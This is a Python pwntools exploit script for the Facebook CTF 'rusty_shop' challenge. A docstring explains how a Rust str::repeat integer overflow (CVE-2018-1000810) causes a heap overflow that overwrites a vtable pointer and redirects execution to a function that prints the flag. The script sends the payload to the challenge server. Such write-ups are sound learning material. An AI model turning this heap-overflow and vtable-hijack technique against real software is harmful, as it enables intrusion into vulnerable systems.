from pwn import *

"""
```
Our Rust dev doesn't like updating his compiler very often, he says it's too much hassle.
nc challenges.fbctf.com 1342
(note: you'll need to run this on at least a two core machine, but we recommend 4+ cores for optimal results)

Author: pippinthedog
```

We were given a rust binary with debug symbols, so it seemed like a 1-day challenge on rust, so I tried it.
First I saw https://www.cvedetails.com/cve/CVE-2018-1000810/ when searching rust cve.
It was an integer overflow problem leading to heap overflow, at str::repeat.
So I searched symbols containing "repeat", and it existed, with user-supplied count.

on add item to bucket menu:
  items.add(item(name=input(), count=int(input())))

on checkout menu:
  item.name.repeat(item.count)


Also, there is a separated thread with infinite loop named `rusty_shop::detect_hacking`. It just did:

```
funcptr vtable_3[1] = rusty_shop::YorkshireCanary::get_name,
        vtable_4[1] = rusty_shop::NorwichCanary::get_name

while(1) {
    Vec vec(capacity=2);

    vec.push((vtable_3))
    vec.push((vtable_4))

    if(vec[0][0]() == "Yorkshire" && vec[1][0]() == "Norwich") {
        continue;
    }

    print("Hacking detected!");
    return;
}
```

After assuming that Vec initializer allocates the buffer on same heap,
I could think that heap overflow at str::repeat affects the pushed vtable on the vector.

So I just put item.name to vtable ptr which pointed `rusty_shop::win` (0000000000701E40),
and triggered the integer overflow at checkout menu. Surprisingly, it worked.

rusty_shop::win prints the flag.
"""

HOST, PORT = "challenges.fbctf.com", "1342"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)
context.log_level='error'

send = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

rr=[]
# ii=lambda x: rr.append('%s'%x)
ii=send

# time.sleep(0.5)
ii(1)
ii(p64(0x0000000000701E40))
ii(0)
ii(0)
ii(4)
ii(1)
ii(2**64/8)
# send('\n'.join(rr))
r.interactive()